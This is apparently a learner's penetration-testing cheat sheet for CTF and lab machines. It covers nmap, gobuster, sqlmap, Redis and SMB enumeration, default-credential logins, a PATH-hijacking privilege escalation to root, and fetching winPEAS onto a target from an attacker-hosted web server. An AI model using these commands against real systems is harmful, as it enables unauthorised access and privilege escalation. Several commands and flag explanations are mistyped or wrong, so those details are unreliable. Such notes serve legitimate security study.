# NOTES
STUDY MATERIAL >.&lt;

- [Uncategorized](#uncategorized)
- [SERVICES](#services)
- [Tools](#tools)
  * [Uncategorized Tools](#uncat-tools)
    + [SNMP WALK](#snmp-walk)
  * [Network Scanning](#network-scanning)
    * [NMAP](#nmap)
  - [WEB DIRECTORY SCANNING](#web-dir-scan) 
    * [GOBUSTER](#gobuster)
    * [FFUZ](#ffuz)

+ [Database](#database)
  - [SQLMAP](#sqlmap)
  - [Redis](#redis)


# Uncategorized
MY PENTEST CHEAT SHEET AND BASIC KALI SETUP/TROUBLESHOOT COMMANDS

Linux Tools, Scripts & Services

 

- Bash Scripts (For CTF)
 > $ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’  → sh to bash shell 

- Exploit PATH Hijacking
```
  matt@pandora:~$ echo "/bin/bash" > tar
  matt@pandora:~$ chmod +x tar
  matt@pandora:~$ ls
  'GCONV_PATH=.'   [setup.sh](http://setup.sh/)   tar   user.txt   value   wget-log
  matt@pandora:~$ export PATH=$(pwd):$PATH
  matt@pandora:~$ /usr/bin/pandora_backup
  PandoraFMS Backup Utility
  Now attempting to backup PandoraFMS client
  root@pandora:~# whoami
  root
```

- Enumeration for SUID files $ find / -user root -perm -4000 -exec ls -ldb {} ; >/tmp/suidfiles

- Enumeration for user executable location $ find / -type d -maxdepth 2 -writable -exec ls -l {} + 2>/dev/null

+ $ find / -type d -maxdepth 2 -writable -exec ls -l {} 2> + /dev/null (THIS ONE DOSENT WORKS)
  -  / : Scan the entire device
  - -type d : Scan for directories only (No files)
  - -maxdepth : The max depth (subfolders) to scan
  - -writable : Check if current user an write in folder
  - -exec : Execute a command on the results returned by find ls
  -l {} + : List the output in long form ( {} is placeholder for the location where result of the find command is substituted. The + at the end is used to terminate the -exec command)


+ $ python3 -m http.server {port} (ip before port is optional i guess) - host file to download on target system, File should be in the same folder where the hosting service is started

+ $ wget {ip}:port/filename

+ $ “curl” is more likely to read the content of files in linux whereas wget is to download the files!!!

+ $ curl –head {IP} - To get the header of the website.
  - for eg. i got “X-Backend-Server: office.paper” for 10.10.11.143 so i added this ip in /etc/hosts following with the IP like this “10.10.11.143 office.paper” and then went to search [http://office.paper](http://office.paper/) and the i got the website running which was earlier showing default apache page bcos it was not set up.   
  

+ $ powershell “curl|wget” http://10.0.0.1/winPEASx64.exe -outfile winPEASx64.exe

## FOR CTF :
```
Finding total flags xD (ctf ezz) $ find / -name flag.txt 2> /dev/null

while true; do echo “yassk” > /root/king.txt; done &
```
==========================================================================================

## KALI LINUX TROUBLE-SHOOTS AND BASICS

1. Unable to download or install packages using "apt-get"
    
    file path = /etc/apt/sources.list
    
    We have to uncomment 2nd source link in sources.list file to be able to use "sudo apt-get install" command.
    After uncommenting use "sudo apt-get update" to update the changes and reflect in our kali system. Then re-run the command not working
    
2. Update kali to latest version
    
    kali@kali:~$sudo apt update
    
    kali@kali:~$ sudo apt full-upgrade -y
   
3. Shells
    
    echo $SHELL -  to print current shell
    
    chsh - to change the current shell.
    
    There are couple of shells in kali from which we can use, currently zsh is by default in my machine.
    

# SERVICES
### SSH
+ $ ssh {ip} - default pass:root $ssh user@ip -p 8080 - port not necessary for default ssh.

+ $ ssh -L 80:localhost:80 user@IP - Here 80 is port we can use our own(better we use 80 so that we dont have to setup a proxy of another port) and localhost is DNS resolution(URL)
OR
+ $ ssh -D port user@ip - this is used for port forwarding, replace port with the port u want to forward it to, setup foxy proxy on SOCKS5 to get that port forwarding to show webpage.

### TELNET
+ $ telnet {IP} used name root (can be admin, administration) and connects instantly.

### SMBCLIENT
+ $ smbclient 

+ $ smbclient -L {IP} (Used -L to show list of host) List of host shows up, now tried to connect with every host and “WorkShares” works with no password if is not configured properly.

+ $ smbclient "\\\\{IP}\\username$" OR "//{IP}/username$" - To connect to listed users.

### FTP
+ $ ftp {IP} {port} - port optional username: Anonymous (only this username works if unconfigured) password: anything would work

### FREERDP
+ $ xfreerdp - microsoft-ds 445 aka remote desktop protocol 

+ xfreerdp /v:10.0.0.0 /cert:ignore /u:user(”Administrator” can be default) /p:password (password optional, we can skip this flag)


# Tools

## Uncategorized Tools
### SNMP WALK
  + $ snmpwalk -v 1 c public 10.10.11.136 - SNMP emumeration tool to get id, pass, etc.

###

## Network Scanning
### NMAP    
+ For a thorough scan of single host: $ nmap -A -p- -v host

+ $ nmap -sC -sV -sU -p- 10.0.0.1 -T4 -A -vvv
   + -T4 is for aggresive time, T5 can be used for insane, T3,T2,T1 are also there but slow
   + -p- is to scan all ports only without additional information
   + -sC is used for default script 
   + -sV is used to detect service information for eg: windows version or version of whatever service is up, etc
   + -sU for udp port scanning (used when there aren’t any useful ports)
   + -p add ports to scan ports only separated  by commans. -p 2256,1015,7785 like this. ez hekor
   + **-sC -sV can take time so only use -p- attribute for fast port scanning. using -sC -sV then scan those individual ports**

## WEB DIRECTORY SCANNING
### GOBUSTER
+ $ gobuster dir -u http://10.0.0.1:8080 -w /directory-list-lowercase-2.3-medium.txt -x php,html (port not necessary)
  + dir : Perform directory brute forcing ( there are other methods aswell)
  + -u : URL/IP of Target
  + -x : Extensions of files to find
  + -w : Wordlist
  + -t {100} : Threads (Used for parallelization), higher the number of threads more the chance of triggering DDOS protection as multiple requests are made within seconds
  
### FFUZ
+ $ ffuz -w /wordlist.txt -u http://ip/FUZZ

# Database
## SQLMAP
+ sqlmap -u ‘URL’ : to check a specific URL or a page for SQL INJECTION
+ sqlmap -u ‘URL’ -b : to grab the banner.
+ Check “sqlmap -h” for more options like dumping database name, tables, columns and entries etc.

## Redis
$ redis-cli -h {ip}

-h : to define the host
-p : can be used to provide the password

+ Basic commands after connecting to the redis server successfully

  - $ info : this will provide information about the redis server

> [!NOTE]
> in the output the last section i.e “# Keyspace” will contain the information about the database with their index number and keys for that database, keys are basically no. of records maybe( or we can say file which have information? ) 

### EXAMPLE OF REDIS

```
After Selecting Keyspace

db0:keys=4,expires=0,avg_ttl=0 --> ( Output is expected to look like this )

————————————END——————————————

here db0 states that there is only 1 database with index 0 and it has 4 keys or files

> $ select 0 

In this, 0 is the index of the database we want to select, for eg “db0” as we got from previously
After select database, we do

 > $ keys *

this command will list all the keys

  > $ get {key}

write the name of the key instead of the {key} and we will get the output of that file
```
